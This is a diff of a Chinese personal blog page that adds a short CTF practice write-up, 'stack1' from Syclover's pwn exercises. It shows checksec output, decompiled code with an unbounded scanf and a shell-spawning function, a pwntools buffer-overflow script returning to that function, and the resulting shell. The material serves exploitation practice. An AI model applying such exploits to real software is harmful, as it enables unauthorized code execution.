@@ -12,7 +12,7 @@
     
     <title>
         
-            标签: poc | 
+            Syclover-Pwn-练习题 | 
         
         iosmosis&#39;s blog
     </title>
@@ -65,15 +65,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://iosmosis.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="标签: poc | iosmosis&#39;s blog">
+    <meta property="og:title" content="Syclover-Pwn-练习题 | iosmosis&#39;s blog">
     <meta property="og:image" content="/img/favicon.png" />
     <meta property="og:description" content="">
     
 
     
+        <meta property="article:published_time" content="6月 09, 2018" />
+        <meta property="article:modified_time" content="6月 09, 2018" />
+    
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="标签: poc | iosmosis&#39;s blog">
+    <meta name="twitter:title" content="Syclover-Pwn-练习题 | iosmosis&#39;s blog">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -81,13 +84,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://iosmosis.github.io/tags/poc/index.html" />
+        <link rel="canonical" href="http://iosmosis.github.io/2018/06/09/Syclover-Pwn-练习题/index.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "iosmosis&#39;s blog",
+        "logo": "/img/favicon.png"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "iosmosis",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/favicon.png"
+        },
+        "description": "期待大学生活的二进制菜鸡"
+    },
+    "headline": "Syclover-Pwn-练习题",
+    "url": "http://iosmosis.github.io/2018/06/09/Syclover-Pwn-练习题/index.html",
+    "datePublished": "6月 09, 2018",
+    "dateModified": "6月 09, 2018",
+    "description": "",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://iosmosis.github.io"
+    }
+}
+</script>
 
 
     
@@ -283,98 +316,223 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+    <!-- Left aligned menu below button -->
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#stack1"><span class="post-toc-number">1.</span> <span class="post-toc-text">stack1</span></a></li></ol>
+        <!--
+        <li class="mdl-menu__item">
+            Some Action
+        </li>
+        -->
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/03/07/str2-045/">Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            
-近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。漏洞编号S2-045，CVE-2017-5638
-
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/03/07/str2-045/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="iosmosis's avatar">
-            </div>
-            <div>
-                <strong>iosmosis</strong>
-                <span>3月 07, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                Syclover-Pwn-练习题
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>iosmosis</strong>
+        <span>6月 09, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAAC5klEQVR42u3aQZLiMBAEQP7/6dkHTGCqWmYWpPSJIIytFIeOrtbj58jrgY2NjY2NjY2Njf2R7Ed8/b7/+pvfn5/d/2K5l29M1oyNjY19Ajt58bPPz2D5piTbtLJmbGxs7HPY10UrWcRsU5LylrzlxZOxsbGxseP24K52AhsbGxv7fQWsbSeuY6xkm274q7CxsbEPYOcBzSwwmr1ldic2Njb2aex20PsJn//DfBsbGxv7I9krVxsJ5YUnaVfq1WJjY2Nvyr5eYhvct5FQPuJtjwfVHRg2Njb217JXisdK65KTZusp6jY2Njb2Ruw8vllpUfLjO0mZzIfN2NjY2Luy28ZjNvpd2b6EPezAsLGxsTdiJ7FOwmvvSXj55r5YMzY2NvbW7HZYe12o8iHBeqhUbC42Njb2puy2kZgd5ZkVnnsP+mBjY2Pvyl6P6VfaieTJt5VDbGxs7K3Zbaw/25R8y9qxRDROwMbGxt6aXYxLR9FPO9B9BlgaG2NjY2Nvyp7FSe84WNk+57poRVkaNjY29kbspG3IS0v7nFnT0kZU2NjY2LuyZ4H7bFg7K05tsRx2YNjY2Nhfy14pDHkgdVezkRdUbGxs7HPYj/JKGpj1X82iq7oVwcbGxt6InZSo9mV3RfxtyPW04GFjY2Nvym6P1KwcxJkd9Llm52vGxsbG3pU9C+vbbcp57f35X4KNjY19DnulPcgL2OxYzyxywsbGxj6BPWs8bgvuRyWtLa7Y2NjYJ7DbwzR5TJ8sMX9LO2bAxsbG3ps9C/3bspQvLt+mutxiY2Njb8puj122A9r8V7OIqvgbsLGxsbdm54Pb9jBlEkXlcVU+VK6zNGxsbOwt2HlY0xa8WeF5lBc2NjY29oy9MiROBgztaOHmqQg2Njb2duwk1p+1DSvj4TfOt7GxsbG/ip0Um3a0cNdbVkYa2NjY2CewZ4PepJC0jNnxnT+db2NjY2N/GPucCxsbGxsbGxsbG/tjrn8IkQttNMUFsAAAAABJRU5ErkJggg==">
+    
+</ul>
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Syclover-Pwn-练习题&url=http://iosmosis.github.io/2018/06/09/Syclover-Pwn-练习题/index.html&pic=&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Syclover-Pwn-练习题&url=http://iosmosis.github.io/2018/06/09/Syclover-Pwn-练习题/index.html&via=iosmosis" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+
+    <!-- Share Google+ -->
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ checksec stack1</div><div class="line">[*] <span class="string">'/home/ios/stack1'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure>
+<p>开启NX保护<br>IAD载入分析代码<br>main()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">&#123;</div><div class="line">  char v4; // [rsp+0h] [rbp-20h]</div><div class="line"></div><div class="line">  puts(&quot;get input&quot;);</div><div class="line">  scanf(&quot;%s&quot;, &amp;v4);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>get_shell()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">int get_shell()</div><div class="line">&#123;</div><div class="line">  return system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>简单栈溢出 已给shell 所以覆盖v4之后ret到get_shell 地址即可<br>exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./stack1'</span>)</div><div class="line">sys_addr=<span class="number">0x000000000004005B6</span></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span> +<span class="string">'b'</span>*<span class="number">8</span> +p64(sys_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>成功取得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ python stack1.py</div><div class="line">[+] Starting local process &apos;./stack1&apos;: pid 2228</div><div class="line">[*] Switching to interactive mode</div><div class="line">get input</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">$ </div><div class="line">[*] Interrupted</div><div class="line">[*] Stopped process &apos;./stack1&apos; (pid 2228)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure></p>
+
+    
+
     
 </div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/2018/05/13/NPUCTF部分Writeup/" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
@@ -533,6 +691,14 @@ It will not impact the appearance and can give developers a lot of support :)
 </aside>
 
                     
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
 
                     
 
